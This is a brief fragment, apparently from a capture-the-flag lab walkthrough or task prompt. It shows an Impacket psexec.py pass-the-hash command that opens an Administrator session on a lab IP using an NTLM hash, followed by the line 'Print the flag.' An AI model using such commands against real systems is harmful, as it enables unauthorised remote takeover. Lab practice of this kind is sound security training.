psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e Administrator@10.129.138.117
```

Print the flag.
